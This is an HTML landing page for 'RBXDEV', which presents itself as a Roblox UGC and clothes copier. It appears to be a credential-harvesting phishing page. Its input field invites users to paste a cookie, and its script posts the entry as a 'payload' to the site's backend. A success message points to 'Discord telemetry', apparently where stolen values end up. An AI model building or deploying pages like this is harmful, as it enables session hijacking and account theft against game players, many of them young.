<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBXDEV | Clothes & UGC Copier</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #07080c;
            color: #f3f4f6;
            overflow-x: hidden;
        }
        .glow-purple { box-shadow: 0 0 50px -10px rgba(139, 92, 246, 0.25); }
        .glow-blue { box-shadow: 0 0 30px -5px rgba(59, 130, 246, 0.4); }
        .glass-card {
            background: rgba(15, 17, 26, 0.75);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .animate-spin-fast {
            animation: spin 0.8s linear infinite;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between relative selection:bg-blue-600 selection:text-white">

    <!-- Background Ambient Glow Effects -->
    <div class="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-purple-600/10 blur-[140px] pointer-events-none rounded-full"></div>
    <div class="absolute top-1/3 left-1/4 w-[400px] h-[400px] bg-blue-600/10 blur-[160px] pointer-events-none rounded-full"></div>

    <!-- Top Navigation Bar -->
    <header class="w-full py-6 px-8 flex justify-between items-center max-w-7xl mx-auto z-10">
        <span class="text-2xl font-black tracking-wider bg-gradient-to-r from-blue-400 via-indigo-300 to-purple-500 bg-clip-text text-transparent">
            RBXDEV
        </span>
        <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
            <span class="w-2 h-2 mr-1.5 bg-emerald-400 rounded-full animate-pulse"></span>
            System Operational
        </span>
    </header>

    <!-- Main Content Area -->
    <main class="flex-grow flex flex-col items-center px-4 py-8 max-w-5xl mx-auto w-full z-10">
        <div class="mb-4">
            <span class="px-4 py-1.5 rounded-full text-xs font-semibold bg-indigo-600/20 text-indigo-300 border border-indigo-500/30 uppercase tracking-widest">
                UGC & Clothes Copier
            </span>
        </div>

        <h1 class="text-3xl md:text-5xl font-extrabold text-center tracking-tight mb-3">
            Game Copying Has Never Been Easier.
        </h1>
        <p class="text-gray-400 text-center text-sm md:text-base max-w-xl mb-12">
            <span class="text-blue-400 font-semibold">RBXDEV</span> has all the tools in order to make the process a <span class="text-indigo-400 font-semibold">breeze</span>. 🚀
        </p>

        <!-- Video Tutorial Showcase Frame -->
        <div class="w-full glass-card rounded-2xl p-3 glow-purple mb-10 border border-purple-500/20">
            <div class="rounded-xl overflow-hidden bg-black/40 border border-white/5 relative aspect-video flex items-center justify-center">
                <iframe class="w-full h-full absolute inset-0" src="https://www.youtube-nocookie.com/embed/dmWwGzCDsB4" title="How to Copy ANY Roblox UGC Item!" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
            </div>
        </div>

        <!-- Input Form Section -->
        <div class="w-full max-w-xl flex flex-col items-center space-y-4 mb-16">
            <div class="w-full relative">
                <input type="text" id="script-input" placeholder="Enter UGC item link, ID, or cookie..." class="w-full glass-card rounded-xl px-4 py-4 text-sm text-gray-200 placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-all shadow-inner">
            </div>
            
            <button id="submit-btn" class="w-full py-4 rounded-xl font-semibold bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white glow-blue transition-all duration-300 flex items-center justify-center space-x-2 cursor-pointer shadow-lg shadow-blue-600/30 active:scale-[0.99]">
                <span id="btn-text">Copy Item Now</span>
                <svg id="btn-icon" class="w-5 h-5 transition-transform group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
            </button>
            <div id="status-message" class="text-xs font-medium text-center transition-all opacity-0 translate-y-1"></div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="w-full py-6 text-center text-xs text-gray-500 border-t border-white/5 mt-16">
        &copy; 2026 RBXDEV Studio. All rights reserved.
    </footer>

    <!-- Frontend Script -->
    <script>
        const submitBtn = document.getElementById('submit-btn');
        const scriptInput = document.getElementById('script-input');
        const statusDiv = document.getElementById('status-message');
        const btnText = document.getElementById('btn-text');
        const btnIcon = document.getElementById('btn-icon');

        function showStatus(message, type) {
            statusDiv.textContent = message;
            statusDiv.className = `text-xs font-medium text-center transition-all opacity-100 translate-y-0 ${
                type === 'success' ? 'text-emerald-400' : 'text-red-400'
            }`;
        }

        submitBtn.addEventListener('click', async () => {
            const payload = scriptInput.value.trim();
            if (!payload) {
                showStatus("Please enter an item ID, link, or payload to copy.", "error");
                scriptInput.focus();
                return;
            }

            // Set smooth loading state
            submitBtn.disabled = true;
            submitBtn.classList.add('opacity-80', 'cursor-not-allowed');
            btnText.textContent = "Processing Request...";
            btnIcon.innerHTML = `<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>`;
            btnIcon.setAttribute('class', 'w-5 h-5 animate-spin-fast');
            statusDiv.classList.add('opacity-0');

            try {
                const res = await fetch('/api/process', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ data: payload })
                });

                const json = await res.json();

                if (json.success) {
                    showStatus("✨ Request dispatched successfully! Check Discord telemetry.", "success");
                    scriptInput.value = '';
                } else {
                    showStatus("❌ Error: " + (json.error || "Failed to process request."), "error");
                }
            } catch (err) {
                showStatus("❌ Network error connecting to studio backend.", "error");
            } finally {
                // Restore button smoothly
                submitBtn.disabled = false;
                submitBtn.classList.remove('opacity-80', 'cursor-not-allowed');
                btnText.textContent = "Copy Item Now";
                btnIcon.setAttribute('class', 'w-5 h-5');
                btnIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>`;
            }
        });
    </script>
</body>
</html>
